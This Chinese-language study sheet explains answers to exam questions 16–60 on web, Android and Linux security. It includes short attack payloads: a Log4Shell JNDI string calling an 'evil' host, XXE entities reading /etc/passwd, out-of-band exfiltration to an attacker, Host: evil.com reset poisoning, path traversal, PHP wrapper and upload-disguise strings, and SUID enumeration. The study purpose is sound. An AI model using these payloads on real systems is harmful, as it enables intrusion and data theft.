# 📒 總衝刺大卷・Q16～Q60 深度解析（獨立檔）

> 承接 [`MASTER_60Q_DEEPDIVE_NOTES.md`](MASTER_60Q_DEEPDIVE_NOTES.md)（Q1~Q15 + 概念釐清）。
> 本檔收 **Q16～Q60**，每題：答案 → 機制 → 誘答拆解 → 考場記法。搭配 [`FINAL_SPRINT_MASTER_60Q.md`](FINAL_SPRINT_MASTER_60Q.md) 題幹看。
> ⚠️ 先更正帶過的觀念：**HttpOnly 不防 XSS，只減輕「cookie 被 JS 偷」**；防 XSS 根本是輸出編碼。CSRF 是攻擊、不是保護。

---

# Part 2 續 — 前端信任邊界（Q16~Q20）

## Q16 — Cookie 三旗標混考
**答案 A**：HttpOnly 使 JS 讀不到 cookie、Secure 僅 HTTPS 傳送、SameSite=Lax 降低 CSRF。

### 三旗標各管各的（釘死別混）
| 旗標 | 作用 | 對付 |
|:--|:--|:--|
| `HttpOnly` | JS 的 `document.cookie` 讀不到 | **減輕** XSS 竊 cookie（不防 XSS 本身）|
| `Secure` | 只在 HTTPS 連線傳送 | 竊聽 / SSL strip |
| `SameSite` | 管跨站請求是否自動帶 cookie | CSRF |

### 選項錯因
- B「HttpOnly 防 CSRF」→ 錯，那是 SameSite 的事。
- C「防 SQL 注入」→ 錯，cookie 旗標與 DB 無關。
- D「Secure 使 JS 無法讀 cookie」→ 錯，那是 HttpOnly；Secure 只管傳輸。
> 記法：**HttpOnly 防讀、Secure 防聽、SameSite 防跨站**。三者正交。

---

## Q17 — 401 vs 403
**答案 B**：已認證但無授權 → 403 Forbidden。

### 語意差別（高頻）
- **401 Unauthorized**＝「**未認證**」：你還沒證明你是誰。通常附 `WWW-Authenticate` 標頭要你提供憑證。給了正確憑證就可能通過。
- **403 Forbidden**＝「**已認證但無授權**」：知道你是誰，但你**沒權限**碰這資源。再給憑證也沒用。
```
沒登入就存取後台 → 401（先去登入）
一般使用者登入後存取 admin 頁 → 403（你是誰我知道，但不准）
```
### 誘答
- A 401：本題「已登入」→ 已認證，不該回 401。
- C 404：有時故意用 404 隱藏資源存在（安全考量），但題目問「最語意正確」→ 403。
- D 500：伺服器錯誤，與授權無關。
> 記法：**401=你是誰？(未認證)；403=我知道你是誰，但不准(未授權)**。

---

## Q18 — 安全回應標頭配對
**答案 D（錯誤配對）**：CSP 不防 SQL 注入。

### 標頭 — 防禦對照
| 標頭 | 防什麼 |
|:--|:--|
| `X-Content-Type-Options: nosniff` | 禁 MIME 嗅探（防把圖片當 script 執行）|
| `Strict-Transport-Security`(HSTS) | 強制 HTTPS（防降級 / SSL strip）|
| `X-Frame-Options: DENY` | 防點擊劫持（禁被 iframe 嵌入）|
| `Content-Security-Policy` | 防 XSS / 控制資源載入 |
| `Referrer-Policy` | 控制 Referer 外洩 |

D 錯在：CSP 是**前端/XSS 領域**，SQL 注入是**伺服器端 DB**，無關（呼應 Q12）。
> 記法：安全標頭都在「瀏覽器行為 / 傳輸」層，**沒有一個防 SQLi**（SQLi 靠參數化）。

---

## Q19 — 郵件驗證三支柱
**答案 D（錯誤）**：DKIM 是簽章（完整性+來源），**不加密**郵件內容。

### SPF / DKIM / DMARC
| 機制 | 做什麼 | DNS 記錄 |
|:--|:--|:--|
| **SPF** | 列出「被授權寄此網域信的 IP」，比對信封寄件者(Return-Path) | TXT |
| **DKIM** | 寄方用私鑰對郵件簽章；收方用 DNS 公鑰驗「沒被竄改+確來自該域」 | TXT(公鑰) |
| **DMARC** | 建立在 SPF/DKIM **對齊(alignment)** 上，定失敗處置(none/quarantine/reject)與回報 | TXT(`_dmarc`) |

D 錯：DKIM 只簽章不加密，郵件內容仍明文（中間人讀得到，但改了簽章會驗不過）。
> 記法：**SPF=誰能寄(IP)、DKIM=沒被改(簽章非加密)、DMARC=驗不過怎麼辦(策略)**。

---

## Q20 — OWASP Top 10 2025 新增
**答案 B**：Software Supply Chain Failures、Mishandling of Exceptional Conditions。

### 重點
- 2025 兩大新增：**軟體供應鏈失效**（含依賴混淆、同名套件覆蓋、被污染的建置流程）、**例外狀況處理不當**。
- 誘答 A/C/D 都是既有項目（Broken Access Control 常年第一、XSS 併入 Injection）。
> 記法：2025 新增＝**供應鏈 + 例外處理**。供應鏈事件(如 xz、各種 npm/PyPI 投毒)是近年主軸。

---

# Part 3 — 架構、語意與深層利用（Q21~Q32）

## Q21 — SSRF 協定利用
**答案 B**：`gopher://` 可構造任意 TCP 位元組流，逐行餵 Redis 指令。

### 為何 gopher 強大
SSRF 若只能用 `http://`，只能發 HTTP 請求。`gopher://` 允許**自訂整個 TCP 封包內容**（含換行），於是能「假裝」成任何純文字協定的客戶端：
- 打內網 **Redis**（無認證）→ 寫 webshell / 寫 crontab / 寫 SSH key。
- 打 **MySQL / SMTP / FastCGI** 等。
### 其他協定
- `dict://` → 探測埠/服務 banner。
- `file://` → 讀本機檔案。
### 誘答
http/https/ftp 都無法「逐位元組構造任意協定內容」，故選 gopher。
> 記法：**SSRF 要打內網純文字協定(Redis/MySQL) → gopher；探服務 → dict；讀檔 → file**。

---

## Q22 — SSRF 繞過：DNS Rebinding
**答案 A**：解析時回公網 IP 過檢查、連線時再解析回內網 IP（TOCTOU 時間差）。

### 機制
```
① 伺服器解析 attacker.com → 回公網 IP(或白名單 IP) → 通過「非內網」檢查
② 攻擊者 DNS 設極短 TTL，第二次解析(實際連線時)→ 回 127.0.0.1 / 內網 IP
③ 連線打到內網
```
關鍵是**檢查時間 ≠ 使用時間（TOCTOU）**：驗證用的 IP 和實際連線用的 IP 不是同一個。
### 誘答
CORS/寬字節/走私皆與「DNS 解析時間差」無關。
> 記法：**先過檢查、再 rebind 到內網 = DNS Rebinding(TOCTOU)**。防禦：解析後鎖定 IP 再連、禁內網網段、用 IMDSv2。

---

## Q23 — SSRF 打 IMDS 防護
**答案 B**：啟用 IMDSv2（需 token 的 PUT 預請求 + hop limit）。

### 機制
- 雲端 `169.254.169.254` 的 Metadata 服務(IMDS)藏臨時 IAM 憑證。IMDSv1 用單純 GET 就能取 → SSRF 一發就偷到憑證。
- **IMDSv2**：要先用 `PUT` 拿 session token，再帶 token 才能 GET。多數 SSRF 只能做 GET、無法做帶標頭的 PUT → 失效。hop limit 限制封包存活跳數，防從容器外轉發。
### 誘答
關防火牆/HTTP2/session 逾時都不對症。
> 記法：**SSRF 打 IMDS → 防護是 IMDSv2(token PUT)**。

---

## Q24 — 反序列化觸發點配對
**答案 D（錯誤）**：`JSON.parse()` 只解析資料、不實例化任意物件，不「必然 RCE」。

### 各語言觸發點
| 語言 | 危險函數 | 魔術方法/鏈 |
|:--|:--|:--|
| PHP | `unserialize()` | `__wakeup` / `__destruct`（POP chain）|
| Python | `pickle.loads()` | `__reduce__`（回傳可呼叫物件+參數）|
| Java | `ObjectInputStream.readObject()` | ysoserial gadget / Log4Shell |
| JS | `JSON.parse()` | **安全**，不會實例化任意類別 |
> 記法：**反序列化危險在「會重建任意物件/呼叫魔術方法」；JSON.parse 只還原純資料，不危險**。防禦：白名單類別、簽章、避免原生序列化。

---

## Q25 — Log4Shell / JNDI
**答案 B**：Log4j 對日誌字串執行 `${jndi:ldap://...}` 查找 → 遠端載入惡意 Java 類別 → RCE。

### 機制
```
攻擊者送出含 ${jndi:ldap://evil/x} 的字串(如 User-Agent)
→ 應用把它寫進 log
→ Log4j 解析 ${} 運算式，觸發 JNDI 查找
→ 連到 evil 的 LDAP → 取回惡意 Java 類別 URL → 載入執行 → RCE
```
關鍵：**可控輸入進了會做運算式解析的 log 函數**；JNDI+遠端類別載入是致命組合。
> 記法：**Log4Shell = 日誌字串觸發 `${jndi:ldap}` 遠端載類別 RCE**（CVE-2021-44228）。供應鏈/熱門元件漏洞代表作。

---

## Q26 — XXE 實體宣告
**答案 A**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">` + 內文 `&xxe;`。

### 機制
XML 允許定義「外部實體」，解析器會去抓 `SYSTEM` 指的資源並展開：
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>    ← 解析時 &xxe; 被替換成 /etc/passwd 內容
```
可讀檔、SSRF(用 `http://`)、DoS(十億笑 billion laughs)。
### 誘答
B 是 XSS、C 是 SQLi、D 是 SSTI 語法，都不是 XML 實體。
> 記法：**XXE = XML 外部實體 `SYSTEM "file://"` 讀檔/SSRF**。防禦：關閉 DTD/外部實體解析。

---

## Q27 — Blind XXE
**答案 B**：外部 DTD + 參數實體，把檔案內容拼進對攻擊者伺服器的 OOB 請求外帶。

### 機制（無回顯時）
```
① XML 引入攻擊者的外部 DTD
② DTD 內用「參數實體」讀本機檔，再把內容拼進一個指向 attacker 的 URL
③ 解析器對 attacker 發出帶著檔案內容的請求(HTTP/FTP) → 攻擊者收到資料
```
本質與 SQL 的 OOB 外帶同理（Q5 家族的「無回顯就外帶」）。
### 誘答
時間盲注(A)不是 XXE 典型手法；CORS(C)無關；D 否定事實。
> 記法：**Blind XXE = 外部 DTD + 參數實體 + OOB 外帶**。

---

## Q28 — JWT 演算法混淆
**答案 B**：RS256→HS256，把公鑰當 HMAC 金鑰偽造；防禦是伺服器硬指定 alg。

### 機制
- RS256 非對稱：私鑰簽、公鑰驗（公鑰是公開的）。
- 若驗證端「信任 token 自報的 alg」，攻擊者改 `alg:HS256`，用**公開的公鑰字串**當 HMAC 對稱金鑰重簽；伺服器也用同一公鑰做 HMAC 驗證 → 通過。
- 根因：驗證端把「本該當公鑰的資料」當成對稱金鑰。
### 防禦
伺服器端**白名單允許的演算法**，不讀 token 的 alg。
> 記法：**RS256→HS256 混淆 = 拿公鑰當 HMAC 金鑰偽造**；防禦＝鎖 alg。另一招是 `alg:none`（直接不驗簽）。

---

## Q29 — JWT 機敏資料
**答案 B**：Header/Payload 僅 Base64Url 編碼（非加密），任何人可解，勿放機敏明文。

### 重點
```
JWT = base64url(header).base64url(payload).簽章
                                   └── 只是編碼，jwt.io 一貼就看光 ──┘
```
- 簽章只保證「沒被竄改」，**不加密內容**。
- 要機敏就用 JWE（加密）或別放敏感資料。
### 誘答
A/C/D 都誇大了 JWT 的保密性。
> 記法：**JWT 簽章 ≠ 加密；Payload 可被任何人解碼**。

---

## Q30 — HTTP 請求走私標記
**答案 A**：前 CL 後 TE = CL.TE；反向為 TE.CL。

### 機制
前端代理與後端伺服器對「請求在哪結束」判斷不一致 → 攻擊者把一段請求「夾帶」進下一個使用者的請求：
- **CL.TE**：前端信 `Content-Length`、後端信 `Transfer-Encoding: chunked`。
- **TE.CL**：反過來。
- 兩者都信 TE → 用混淆的 TE 標頭(TE.TE)讓其中一端忽略。
> 記法：**命名 = 前端.後端 各信哪個標頭**。防禦：前後端統一解析、優先 TE、拒絕同時含 CL+TE 的請求、用 HTTP/2。

---

## Q31 — Web 快取投毒
**答案 A**：可控且影響回應的輸入（未納快取鍵的 header）被快取後服務給他人。

### 機制
```
① 某 header(如 X-Forwarded-Host)影響回應內容，但「不在快取鍵內」
② 攻擊者送出帶惡意 header 的請求 → 回應(被污染)被快取
③ 其他正常使用者命中快取 → 拿到被污染的回應(如注入的 XSS/重導向)
```
關鍵：**快取鍵 ≠ 實際影響回應的輸入**（unkeyed input）。
### 誘答
堆疊查詢/HTTP 版本/HttpOnly 都與快取鍵無關。
> 記法：**快取投毒 = unkeyed 可控輸入污染回應 + 被快取供他人**。

---

## Q32 — Host 標頭攻擊
**答案 A**：密碼重置投毒——重置連結網域被改成攻擊者站，token 外洩。

### 機制
```
應用產生重置連結時用了請求的 Host / X-Forwarded-Host:
  https://{{Host}}/reset?token=XXX
攻擊者送 Host: evil.com → 受害者收到 https://evil.com/reset?token=XXX
受害者一點 → token 送到 evil.com → 攻擊者拿 token 重置其密碼
```
> 記法：**信任 Host/X-Forwarded-Host 產連結 → 密碼重置投毒**。防禦：用固定白名單網域產連結，驗證 Host。

---

# Part 4 — 檔案、上傳、路徑與協定（Q33~Q40）

## Q33 — LFI 與 PHP 包裝器
**答案 A**：`php://filter/convert.base64-encode/resource=index.php` 以 base64 讀原始碼。

### 機制
直接 `include('index.php')` 會把 PHP **執行掉**（你看不到原始碼）。用 `php://filter` 套 base64 編碼：PHP 先把檔案 base64 編碼（變成純文字、不再是可執行 PHP）再輸出 → 你拿到 base64 解碼即得原始碼。
### 其他包裝器
- `data://text/plain,<?php ...?>` → 直接餵 payload（RCE）。
- `php://input` → 把 POST body 當程式碼。
- `expect://` → 執行命令。
> 記法：**LFI 讀 PHP 源碼 → `php://filter/convert.base64-encode/resource=`**。

---

## Q34 — 路徑穿越編碼繞過
**答案 A**：`%2e%2e%2f`（編碼 `../`）或 `....//`（過濾後剩 `../`）。

### 機制
- `%2e%2e%2f` = URL 編碼的 `../`，若過濾器只比對字面 `../`、但伺服器稍後才 URL 解碼 → 繞過（對照 Q3「在對的層解碼」）。
- `....//` → 過濾器把 `../` 刪一次 → 剩下的字元重組又變回 `../`（非遞迴過濾的漏洞）。
- 其他：`..%252f`(雙重編碼)、`..\/`、絕對路徑。
### 誘答
`./` 不跳目錄、加 `https://` 無關、改 POST 無關。
> 記法：**穿越繞過：編碼 `%2e%2e%2f` / 非遞迴過濾殘留 `....//` / 雙重編碼**。

---

## Q35 — Apache 多副檔名解析
**答案 A**：Apache 由右至左解析，`.jpg` 不識別則回退命中 `.php` 交 PHP 處理。

### 機制
舊 Apache(mod_mime)對 `shell.php.jpg`：從右看 `.jpg`→不是已知處理器→往左看 `.php`→命中 PHP handler → **當 PHP 執行**。於是「圖片」其實被當程式跑。
### 相關
- Nginx 的 `.php` 解析漏洞(cgi.fix_pathinfo)：`shell.jpg/x.php`。
- 繞上傳：雙副檔名、`.phtml`/`.php5`、大小寫、`.htaccess`。
> 記法：**Apache 副檔名右到左回退 → `x.php.jpg` 可執行**。

---

## Q36 — Nginx alias 目錄穿越
**答案 A**：`/files../` → `/var/www/data../` = `/var/www/`，off-by-slash。

### 機制
```nginx
location /files {           # ← 注意無結尾斜線
    alias /var/www/data/;
}
```
請求 `/files../` → Nginx 把 `/files` 換成 alias → `/var/www/data/` + `../` → `/var/www/`，跳出預期目錄。根因是 location 無結尾 `/` 與 alias 的拼接方式（off-by-slash）。
> 記法：**Nginx alias 無結尾斜線 → `/files../` 穿越**。防禦：location 與 alias 都加結尾 `/`。

---

## Q37 — 檔案上傳繞過
**答案 D（不屬於）**：`SameSite=None` 是 cookie 屬性，與上傳無關。

### 真正的上傳繞過(A/B/C)
- 偽造 `Content-Type: image/png`。
- 竄改 Magic Bytes 檔頭偽裝圖片、後段夾 PHP（`GIF89a;<?php...`）。
- 雙副檔名 / 大小寫 / `.htaccess` / 空字元截斷(舊版 `shell.php%00.jpg`)。
> 記法：上傳繞過＝騙**副檔名/MIME/Magic Bytes/解析器**；`SameSite` 是誘答。

---

## Q38 — Magic Bytes 配對
**答案 D（錯誤）**：`4D 5A`(MZ) 是 PE/EXE，不是 ELF。ELF 是 `7F 45 4C 46`。

### 必背檔頭
| 類型 | Magic Bytes |
|:--|:--|
| PNG | `89 50 4E 47` |
| JPG | `FF D8 FF` |
| GIF | `47 49 46 38`(GIF8) |
| PDF | `25 50 44 46`(%PDF) |
| ZIP/docx/apk/jar | `50 4B 03 04`(PK) |
| PE/EXE/DLL | `4D 5A`(MZ) |
| ELF | `7F 45 4C 46`(.ELF) |
> 記法：**MZ=Windows執行檔、7F ELF=Linux執行檔、PK=壓縮族、%PDF、89PNG、FFD8 JPG**。

---

## Q39 — ELF vs PE 檔頭
**答案 A**：ELF=`7F 45 4C 46`；PE=`4D 5A`(MZ)。

同 Q38 延伸。Windows 可執行檔(.exe/.dll)以 DOS header `MZ` 開頭；Linux 以 `\x7fELF` 開頭。逆向/鑑識常靠這第一眼判平台。
> 記法：**Windows=MZ、Linux=ELF**。

---

## Q40 — 開放重定向
**答案 A**：Open Redirect；常串接釣魚 / OAuth token 竊取 / 繞 SSRF 白名單。

### 機制
`?next=https://evil.com` 未驗證就跳轉 → 釣魚(掛在可信網域的連結最後跳到假站)、OAuth 流程竊 token(redirect_uri 污染)、繞 SSRF(先指可信域再 302 到內網)。
> 記法：**未驗證的跳轉參數 = 開放重定向**；本身低危但常當跳板串接。防禦：白名單允許的跳轉目標、只允許相對路徑。

---

# Part 5 — Android / Java 逆向（Q41~Q48）

## Q41 — APK 結構
**答案 D（錯誤）**：APK 內是編譯後 dex 位元碼，非明文 `.java`。

### APK = ZIP，解壓得
| 檔案 | 內容 |
|:--|:--|
| `AndroidManifest.xml` | 二進位 XML（權限、元件、匯出旗標），需 apktool/aapt 還原 |
| `classes.dex` | Dalvik/ART 位元碼（Java 層邏輯）|
| `resources.arsc` | 編譯後資源 |
| `lib/` | 各 ABI 原生 `.so`（armeabi-v7a/arm64-v8a/x86）|
| `META-INF/` | 簽章 |
> 記法：**APK=ZIP；dex=位元碼非 .java；Manifest 是二進位 XML**。

---

## Q42 — 工具分工
**答案 D（錯誤）**：jadx 輸出僅供閱讀，**不能回編譯**成 APK；重打包用 apktool。

| 工具 | 用途 |
|:--|:--|
| **jadx** | dex→近似 Java，**讀**邏輯（不可回編）|
| **apktool** | 反編譯資源+smali，改後 `apktool b` **重打包**（需重簽）|
| **Frida** | 執行期動態 hook、繞 root/SSL pinning |
| jd-gui | 看 `.class`/`.jar` 原始碼 |
> 記法：**讀邏輯 jadx、重打包 apktool、動態 Frida、看 class jd-gui**。

---

## Q43 — Smali 暫存器
**答案 A**：instance 方法 `p0`=this、`p1`=第一個參數。

### 重點
- 非靜態方法：`p0` 永遠是 `this`（當前物件），`p1` 起才是參數。
- 靜態方法：沒有 this，`p0` 即第一個參數。
- `v0 v1...` 是區域暫存器；`.registers`/`.locals` 宣告數量。
> 記法：**instance 方法 p0=this；static 方法 p0=第一參數**。

---

## Q44 — Smali 控制流
**答案 A**：`if-eqz v1,:cond_fail` 在 `v1==0`(equals 回 false)時跳 fail → 「不相等就失敗」。

### 重點
- `if-eqz`＝if equal zero（==0/null 才跳）；`if-nez`＝!=0 才跳。
- `equals` 回傳 boolean：true=1、false=0。
- 破解：把 `if-eqz` 改 `if-nez`、或 NOP 掉跳轉、或直接 `const v1,0x1` 強制通過。
> 記法：**if-eqz=等於0跳、if-nez=不等於0跳**；改這兩個就能反轉驗證。

---

## Q45 — DEX vs SO
**答案 A**：dex=Dalvik 位元碼(jadx/baksmali)；so=原生機械碼(IDA/Ghidra 以 ARM/x86 反組譯)。

### 重點
- `.dex`：Java 層，反編譯回近似 Java。
- `.so`：JNI 原生庫(C/C++ 編譯的機械碼)，要用反組譯器看 ARM/x86 指令。核心演算法常故意放 so 增加逆向難度。
> 記法：**dex=Java層(jadx)、so=原生層(IDA/Ghidra)**。

---

## Q46 — ProGuard 混淆
**答案 D（錯誤）**：ProGuard/R8 做重命名+壓縮+優化，**不加密字串**；明文字串在 jadx 仍可見。

### 重點
- 混淆：類別/方法/欄位改名 `a`,`b`,`c`（降低可讀性）。
- 壓縮：移除未用程式碼。優化：內聯等。
- **不加密字串常數** → 找 flag/密鑰常從明文字串切入。
- 還原對應需 `mapping.txt`。字串加密要靠額外的殼(如 DexGuard 商業版/加固)。
> 記法：**ProGuard=改名+瘦身，不加密字串**；想藏字串要另上加固。

---

## Q47 — 逆向工具選擇
**答案 A**：純靜態讀邏輯首選 jadx。
apktool 要手讀 smali 較費時、Frida 要執行、Wireshark 抓封包。
> 記法：**靜態讀邏輯 = jadx**。

---

## Q48 — Frida 使用情境
**答案 A**：執行時 hook `checkLicense()` 強制回 true 繞過授權。

### 重點
Frida 是**動態插樁**：App 執行中注入 JS，攔截/改寫任意方法的參數與回傳、繞過 root 偵測/SSL pinning/完整性校驗。
- B(靜態讀)→jadx；C(反編譯存檔)→jadx/apktool；D(磁碟映像)→鑑識工具。
> 記法：**Frida=執行期動態 hook 改回傳值**。

---

# Part 6 — 通識：Linux 權限 / Port / 雲端（Q49~Q55）

## Q49 — Linux 權限數字
**答案 A**：`-rwsr-xr-x` = `4755`；`s`=SUID（以檔案擁有者身分執行）。

### 計算
```
rws r-x r-x
 │   │   └ other: r-x = 4+0+1 = 5
 │   └──── group: r-x = 5
 └──────── owner: rws → rwx(7) + SUID(特殊位4)
特殊位: SUID=4 → 前綴 4 → 4755
```
> 記法：`rwx`=4/2/1；特殊位 SUID=4、SGID=2、Sticky=1，寫在最前。

---

## Q50 — 特殊權限位
**答案 D（錯誤）**：SUID 對**目錄無效**（Linux 忽略目錄的 SUID），不會自動提權。

| 特殊位 | 八進位 | 檔案上 | 目錄上 |
|:--|:--|:--|:--|
| SUID | 4000 | 以檔案 owner 身分執行 | **無效(忽略)** |
| SGID | 2000 | 以檔案 group 身分執行 | 新建檔案繼承該目錄 group |
| Sticky | 1000 | （現代無意義）| 只有檔主能刪自己的檔(如 `/tmp`) |
> 記法：**SUID 只對執行檔有意義、對目錄無效**；SGID 對目錄=繼承 group；Sticky 對目錄=防刪他人檔。

---

## Q51 — 找 SUID 提權點
**答案 A**：`find / -perm -4000 -type f 2>/dev/null`（`-4000` 代表「含有」該位元）。

### 重點
- `-perm -4000`：**含有** SUID 位即符合（正確、不漏）。
- `-perm 4000`：權限位**完全相等**才符合 → 會漏掉 `4755` 等 → B 錯。
- 找到後對照 **GTFOBins** 看能否提權。
> 記法：**`-perm -4000`(減號=含有) 才對；無減號=完全相等會漏**。

---

## Q52 — Linux Capabilities
**答案 A**：把 root 特權切成細粒度能力(`cap_setuid` 等)；`getcap -r /` 列舉。

### 重點
- 傳統 SUID 是「全有全無」的 root。Capabilities 細分：`cap_net_raw`(抓封包)、`cap_setuid`(切 UID)、`cap_dac_override`(繞權限檢查)等。
- `getcap -r / 2>/dev/null` 列舉；帶 `cap_setuid+ep` 的程式往往可提權（等同 SUID 效果）。
> 記法：**Capabilities=細粒度 root；`getcap` 列舉；cap_setuid 可提權**。另一個現代提權面。

---

## Q53 — 常用 Port 配對
**答案 D（錯誤）**：443=HTTPS（非FTP）、143=IMAP（非RDP）、110=POP3（非SSH），全錯。

### 必背 Port
| Port | 服務 | Port | 服務 |
|:--|:--|:--|:--|
| 21 | FTP | 161 | SNMP |
| 22 | SSH | 389 | LDAP |
| 23 | Telnet | 443 | HTTPS |
| 25 | SMTP | 445 | SMB |
| 53 | DNS | 3306 | MySQL |
| 80 | HTTP | 3389 | RDP |
| 110 | POP3 | 5432 | PostgreSQL |
| 143 | IMAP | 6379 | Redis |
> 記法：A/B/C 全對、D 全錯。熟到反射才能一眼挑錯。

---

## Q54 — 雲端共同責任(IaaS)
**答案 C**：IaaS 下客戶負責 OS 修補、應用、資料與 IAM。

### 分層
```
IaaS：雲商管「實體/網路/虛擬化」；客戶管「OS 以上(含修補、middleware、app、資料、IAM)」
```
A/B/D(實體/虛擬化/網路硬體)都是雲商責任。
> 記法：**IaaS 客戶從 OS 開始全包**。

---

## Q55 — 共同責任鐵律
**答案 A**：資料與 IAM 永遠客戶責任；越往 SaaS 雲商承擔越多底層。

### 分層表
| 項目 | IaaS | PaaS | SaaS |
|:--|:--|:--|:--|
| 實體/網路/虛擬化 | 雲商 | 雲商 | 雲商 |
| OS/執行環境 | **客戶** | 雲商 | 雲商 |
| 應用程式 | 客戶 | **客戶** | 雲商 |
| **資料 + IAM** | 客戶 | 客戶 | **客戶** |
> 記法：**資料與身分(IAM)永遠客戶的**；B(SaaS 管 OS)、C(IaaS 雲商管你 app)、D(都一樣)皆錯。

---

# Part 7 — Misc 隱寫 / 工具總表（Q56~Q60）

## Q56 — 音訊隱寫
**答案 A**：頻譜圖(Spectrogram)隱寫——訊息畫在頻率-時間圖上。

### 重點
- 聽是雜訊，開 Audacity / Sonic Visualiser 的**頻譜圖**顯現文字/圖案。
- 其他音訊隱寫：LSB、DTMF(電話按鍵音)、摩斯電碼、聲道差異。
> 記法：**音檔雜訊看不懂 → 開頻譜圖(Spectrogram)**。

---

## Q57 — 壓縮檔偽加密
**答案 A**：檢視加密旗標位(general purpose bit flag)是否與實際一致，改回 0 即可解壓。

### 重點
- ZIP「偽加密」：標了加密旗標但資料其實沒加密。用 010 Editor/winhex 把本機檔頭與中央目錄的加密位元改 0 即可正常解。
- 真加密才需破解：**已知明文攻擊**(bkcrack)、CRC32 爆破(小檔)、字典/爆破。
> 記法：**ZIP 偽加密=改旗標位；真加密=已知明文/CRC 爆破**。

---

## Q58 — 圖片隱寫工具
**答案 D（錯誤）**：steghide 是圖片/音檔隱寫藏取，**不是反編譯 APK**。

| 工具 | 用途 |
|:--|:--|
| `zsteg` | PNG/BMP 的 LSB 隱寫偵測 |
| `exiftool` | 讀 EXIF/metadata |
| `binwalk` | 偵測/抽出夾帶檔案(carving) |
| `steghide` | 圖片/音檔隱寫藏匿與提取(常需密碼) |
| `stegsolve` | 通道/位元平面檢視 |
> 記法：steghide/zsteg/binwalk/exiftool 都是隱寫族；**反編譯 APK 是 jadx/apktool**。

---

## Q59 — 工具總表誘答（挑不同類）
**答案 D**：gflags 是 Windows 除錯旗標工具，**不是**目錄掃描/fuzzing。

### 重點
- gobuster / dirsearch / ffuf / dirb → 目錄/檔案暴力掃描、fuzzing。
- **gflags** → Windows 除錯旗標設定（2024 金盾經典誘答）。
> 記法：**gflags 非掃描工具**。類題：挑出不屬於同類的工具。

---

## Q60 — 工具用途辨識
**答案 D（錯誤）**：DIE(Detect It Easy) 是辨識加殼/編譯器/檔案類型，**不是** SQL 注入工具（那是 sqlmap）。

### 2024 考過的工具（重點記）
| 工具 | 用途 |
|:--|:--|
| Volatility 3 | 記憶體分析(pslist/psscan/malfind) |
| 1768.py | 抽 Cobalt Strike 設定檔 |
| Hollow Hunter | 偵測 process hollowing |
| Regshot | 比對登錄檔前後變更 |
| DIE | 辨識加殼/編譯器/檔案類型 |
| gflags | Windows 除錯旗標（非掃描）|
> 記法：**DIE≠sqlmap**；Volatility=記憶體、1768=CS、Hollow Hunter=掉空、Regshot=登錄檔比對。

---

# 🧠 Q16~Q60 高頻深度考點濃縮（考前掃這段）
1. **cookie 三旗標**：HttpOnly 防讀(XSS 減災)、Secure 防聽、SameSite 防跨站(CSRF)。
2. **401=未認證、403=已認證未授權**。安全標頭沒一個防 SQLi。
3. **郵件**：SPF=TXT 列 IP、DKIM=簽章(非加密)、DMARC=對齊+處置。
4. **OWASP 2025 新增**：供應鏈失效、例外處理不當。
5. **SSRF**：gopher 打 Redis、DNS Rebinding(TOCTOU)、IMDSv2 防護。
6. **反序列化**：PHP `__wakeup`/`__destruct`、Python `__reduce__`、Java `readObject`/Log4Shell JNDI；JSON.parse 安全。
7. **JWT**：Base64 非加密勿放機敏；RS256→HS256 混淆；alg:none。
8. **走私** CL.TE/TE.CL=前端.後端信哪個；**快取投毒**=unkeyed 輸入；**Host 注入**=重置投毒。
9. **檔案**：`php://filter` 讀源碼、Apache 右到左回退、Nginx alias off-by-slash、上傳繞 MIME/Magic。
10. **Magic Bytes**：MZ=PE、7F ELF=Linux、PK=ZIP族、%PDF、89PNG、FFD8 JPG。
11. **Smali**：p0=this、if-eqz=等0跳、dex(jadx) vs so(IDA)、ProGuard 不加密字串、Frida 動態 hook。
12. **Linux**：rwx=421、SUID=4(對目錄無效)、`-perm -4000`(含)≠4000(等)、Capabilities getcap。
13. **Port**：21/22/23/25/53/80/110/143/161/389/443/445/3306/3389 背到反射。
14. **雲端**：資料+IAM 永遠客戶責任；IaaS 客戶從 OS 起。
15. **隱寫**：音檔→頻譜圖、ZIP 偽加密改旗標、steghide/zsteg/binwalk/exiftool。
16. **工具誘答**：gflags 非掃描、DIE 非 sqlmap、steghide 非反編譯、1768/Hollow Hunter/Regshot(2024)。
